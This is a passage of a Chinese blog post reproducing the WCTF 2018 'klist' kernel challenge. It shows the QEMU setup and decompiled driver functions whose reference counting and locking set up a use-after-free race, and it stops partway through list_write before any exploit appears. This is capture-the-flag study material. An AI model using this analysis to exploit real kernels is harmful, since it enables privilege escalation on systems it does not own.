<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="wctf2018-klist 复现 123456789101112#!&#x2F;bin&#x2F;shqemu-system-x86_64 -enable-kvm -cpu kvm64,+smep # 开了smep-kernel .&#x2F;bzImage -append &quot;console&#x3D;ttyS0 root&#x3D;&#x2F;dev&#x2F;ram rw oops&#x3D;panic panic&#x3D;1 quiet kaslr&quot; #">
<meta property="og:type" content="article">
<meta property="og:title" content="UAF+条件竞争">
<meta property="og:url" content="http://example.com/2022/05/27/UAF+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:description" content="wctf2018-klist 复现 123456789101112#!&#x2F;bin&#x2F;shqemu-system-x86_64 -enable-kvm -cpu kvm64,+smep # 开了smep-kernel .&#x2F;bzImage -append &quot;console&#x3D;ttyS0 root&#x3D;&#x2F;dev&#x2F;ram rw oops&#x3D;panic panic&#x3D;1 quiet kaslr&quot; #">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2022-05-27T07:11:26.000Z">
<meta property="article:modified_time" content="2022-06-22T05:25:29.862Z">
<meta property="article:author" content="yhellow">
<meta property="article:tag" content="kernel">
<meta property="article:tag" content="UAF">
<meta property="article:tag" content="Race condition">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/2022/05/27/UAF+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>UAF+条件竞争 | Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/27/UAF+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          UAF+条件竞争
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-27 15:11:26" itemprop="dateCreated datePublished" datetime="2022-05-27T15:11:26+08:00">2022-05-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-06-22 13:25:29" itemprop="dateModified" datetime="2022-06-22T13:25:29+08:00">2022-06-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>12k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>11 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p><strong>wctf2018-klist 复现</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 </span><br><span class="line">-enable-kvm </span><br><span class="line">-cpu kvm64,+smep # 开了smep</span><br><span class="line">-kernel ./bzImage </span><br><span class="line">-append &quot;console=ttyS0 root=/dev/ram rw oops=panic panic=1 quiet kaslr&quot; # 开了kaslr </span><br><span class="line">-initrd ./rootfs.cpio</span><br><span class="line">-nographic -m 2G # 我去,直接给2G</span><br><span class="line">-smp cores=2,threads=2,sockets=1 -monitor /dev/null </span><br><span class="line">-nographic</span><br><span class="line">~  </span><br></pre></td></tr></table></figure>
<p>PS：我们加上 “-s” 方便调试</p>
<p>然后做好基础工作：解压 rootfs.cpio，提取 vmlinux，提取 gadget</p>
<p>一般的 kernel pwn 都喜欢在驱动文件那里设置漏洞，用 IDA 进行分析：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x0</span>)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>list_ioctl：设置了“add_item”，“remove_item”，“select_item”函数，“list_head”函数</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">list_ioctl</span><span class="params">(__int64 fd, <span class="keyword">unsigned</span> <span class="keyword">int</span> request, <span class="keyword">void</span> *user_ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( request == <span class="number">0x1338</span> )</span><br><span class="line">    <span class="keyword">return</span> select_item((fd *)fd, (__int64)user_ptr);</span><br><span class="line">  <span class="keyword">if</span> ( request &lt;= <span class="number">0x1338</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( request == <span class="number">0x1337</span> )</span><br><span class="line">      <span class="keyword">return</span> add_item((input *)user_ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( request == <span class="number">0x1339</span> )</span><br><span class="line">      <span class="keyword">return</span> remove_item((__int64)user_ptr);</span><br><span class="line">    <span class="keyword">if</span> ( request == <span class="number">0x133A</span> )</span><br><span class="line">      <span class="keyword">return</span> list_head(user_ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>add_item：创建节点，插入链表头部</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">add_item</span><span class="params">(input *user_input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  item *list_ptr; <span class="comment">// rax MAPDST</span></span><br><span class="line">  __int64 size; <span class="comment">// rdx</span></span><br><span class="line">  __int64 item_ptr; <span class="comment">// rsi</span></span><br><span class="line">  item *prev; <span class="comment">// rax</span></span><br><span class="line">  input user_data; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(&amp;user_data, user_input, <span class="number">16LL</span>) || user_data.size &gt; <span class="number">0x400</span>uLL )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">  list_ptr = (item *)_kmalloc(user_data.size + <span class="number">24</span>, <span class="number">0x14202C0</span>LL);</span><br><span class="line">  size = user_data.size;</span><br><span class="line">  item_ptr = user_data.ptr;</span><br><span class="line">  list_ptr-&gt;refcount = <span class="number">1</span>; <span class="comment">/* 设置引用计数refcount为&#x27;1&#x27;(关键) */</span></span><br><span class="line">  list_ptr-&gt;size = size;</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(&amp;list_ptr-&gt;data, item_ptr, size) )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(list_ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    mutex_lock(&amp;list_lock); <span class="comment">/* 添加互斥锁 */</span></span><br><span class="line">    prev = g_list;</span><br><span class="line">    g_list = list_ptr; <span class="comment">/* 直接插头 */</span></span><br><span class="line">    list_ptr-&gt;next = prev;</span><br><span class="line">    mutex_unlock(&amp;list_lock); <span class="comment">/* 解除互斥锁 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>remove_item：释放结点，并且脱链</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">remove_item</span><span class="params">(__int64 idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  item *list_unit; <span class="comment">// rax MAPDST</span></span><br><span class="line">  __int64 i; <span class="comment">// rdx</span></span><br><span class="line">  item *delete_list_unit; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( idx &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    mutex_lock(&amp;list_lock); <span class="comment">/* 添加互斥锁 */</span></span><br><span class="line">    <span class="keyword">if</span> ( !idx )</span><br><span class="line">    &#123;</span><br><span class="line">      list_unit = g_list;</span><br><span class="line">      <span class="keyword">if</span> ( g_list )</span><br><span class="line">      &#123;</span><br><span class="line">        g_list = g_list-&gt;next;</span><br><span class="line">        put(list_unit);</span><br><span class="line">        mutex_unlock(&amp;list_lock); <span class="comment">/* 解除互斥锁 */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    &#125;</span><br><span class="line">    list_unit = g_list;</span><br><span class="line">    <span class="keyword">if</span> ( idx != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !g_list )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_12:</span><br><span class="line">        mutex_unlock(&amp;list_lock); <span class="comment">/* 解除互斥锁 */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      i = <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ++i;</span><br><span class="line">        list_unit = list_unit-&gt;next;</span><br><span class="line">        <span class="keyword">if</span> ( idx == i )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !list_unit )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    delete_list_unit = list_unit-&gt;next;</span><br><span class="line">    <span class="keyword">if</span> ( delete_list_unit )</span><br><span class="line">    &#123;</span><br><span class="line">      list_unit-&gt;next = delete_list_unit-&gt;next;</span><br><span class="line">      put(delete_list_unit);</span><br><span class="line">      mutex_unlock(&amp;list_lock); <span class="comment">/* 解除互斥锁 */</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>select_item：选择指定位置的节点记录到缓冲区里（这样才能对其进行 read/write 操作）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">select_item</span><span class="params">(fd *fd, __int64 idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  item *list_unit; <span class="comment">// rbx</span></span><br><span class="line">  __int64 i; <span class="comment">// rax</span></span><br><span class="line">  <span class="built_in">list</span> *using_list; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  mutex_lock(&amp;list_lock); <span class="comment">/* 添加互斥锁 */</span></span><br><span class="line">  list_unit = g_list; <span class="comment">/* g_list为list_unit链表头 */</span></span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !g_list ) <span class="comment">/* 头结点不存在,返回错误代码 */</span></span><br><span class="line">    &#123;</span><br><span class="line">LABEL_8:</span><br><span class="line">      mutex_unlock(&amp;list_lock); <span class="comment">/* 解除互斥锁 */</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    i = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> ) <span class="comment">/* 遍历整个list_unit链表,获取对应index的item结点 */</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++i;</span><br><span class="line">      list_unit = list_unit-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> ( idx == i )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !list_unit )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !list_unit ) <span class="comment">/* 输入的index没有对应的结点,返回错误代码 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">  get(list_unit); </span><br><span class="line">  mutex_unlock(&amp;list_lock); <span class="comment">/* 解除互斥锁 */</span></span><br><span class="line">  using_list = fd-&gt;using_list; <span class="comment">/* 从结构体fd中获取内核缓冲区(从kmem_cache分配) */</span></span><br><span class="line">  mutex_lock(&amp;using_list-&gt;mutex); <span class="comment">/* 添加互斥锁 */</span></span><br><span class="line">  put(using_list-&gt;item); </span><br><span class="line">  using_list-&gt;item = list_unit; <span class="comment">/* 注意:如果item在put中被释放,后面的解锁就会报错 */</span></span><br><span class="line">  mutex_unlock(using_list-&gt;mutex); <span class="comment">/* 解除互斥锁 */</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">get</span><span class="params">(item *item)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _InterlockedIncrement(&amp;item-&gt;refcount); <span class="comment">/* 实现数的原子加 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">put</span><span class="params">(item *item)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( item )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !_InterlockedDecrement(&amp;item-&gt;refcount) ) <span class="comment">/* 实现数的原子减 */</span></span><br><span class="line">      <span class="keyword">return</span> kfree(item); <span class="comment">/* item-&gt;refcount减到&#x27;0&#x27;后释放item */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>list_open：打开一个文件</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">list_open</span><span class="params">(__int64 a1, fd *fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">list</span> *using_list; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  using_list = (<span class="built_in">list</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x14282C0</span>LL, <span class="number">0x28</span>LL); <span class="comment">/* 从kmem_cache中分配一个object,作为缓冲区 */</span></span><br><span class="line">  _mutex_init(&amp;using_list-&gt;mutex, <span class="string">&quot;&amp;data-&gt;lock&quot;</span>, &amp;copy_from_user); <span class="comment">/* 初始化互斥锁 */</span></span><br><span class="line">  fd-&gt;using_list = using_list; <span class="comment">/* 把缓冲区using_list存储在fd结构体中 */</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>list_read：读操作</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">list_read</span><span class="params">(fd *fd, __int64 addr, <span class="keyword">unsigned</span> __int64 size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">list</span> *using_list; <span class="comment">// r13</span></span><br><span class="line">  item *item; <span class="comment">// rsi</span></span><br><span class="line">  __int64 *mutex_var; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  using_list = fd-&gt;using_list; <span class="comment">/* 从结构体fd中获取内核缓冲区(从kmem_cache分配) */</span></span><br><span class="line">  mutex_lock(&amp;using_list-&gt;mutex); <span class="comment">/* 添加互斥锁 */</span></span><br><span class="line">  item = using_list-&gt;item; <span class="comment">/* item:指向缓冲区的指针 */</span></span><br><span class="line">  <span class="keyword">if</span> ( using_list-&gt;item )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( item-&gt;size &lt;= size )</span><br><span class="line">      size = item-&gt;size; <span class="comment">/* 限制点:杜绝了缓冲区溢出的发生 */</span></span><br><span class="line">    mutex_var = using_list-&gt;mutex;</span><br><span class="line">    <span class="keyword">if</span> ( copy_to_user(addr, &amp;item-&gt;data, size) ) <span class="comment">/* 把内核数据拷贝到用户缓冲区 */</span></span><br><span class="line">    &#123;</span><br><span class="line">      mutex_unlock(mutex_var); <span class="comment">/* 解除互斥锁 */</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      mutex_unlock(mutex_var); <span class="comment">/* 解除互斥锁 */</span></span><br><span class="line">      <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    mutex_unlockusing_list-&gt;mutex); <span class="comment">/* 解除互斥锁 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>list_write：写操作</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">list_write</span><span class="params">(fd *fd, __int64 addr, <span class="keyword">unsigned</span> __int64 size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">list</span> *using_list; <span class="comment">// rbp</span></span><br><span class="line">  item *item; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  __int64 *mutex_var; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">  using_list = fd-&gt;using_list; <span class="comment">/* 从结构体fd中获取内核缓冲区(从kmem_cache分配) */</span></span><br><span class="line">  mutex_lock(&amp;using_list-&gt;mutex); <span class="comment">/* 添加互斥锁 */</span></span><br><span class="line">  item = using_list-&gt;item; <span class="comment">/* item:指向缓冲区的指针 */</span></span><br><span class="line">  <span class="keyword">if</span> ( using_list-&gt;item )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( item-&gt;size &lt;= size )</span><br><span class="line">      size = item-&gt;size; <span class="comment">/* 限制点:杜绝了缓冲区溢出的发生 */</span></span><br><span class="line">  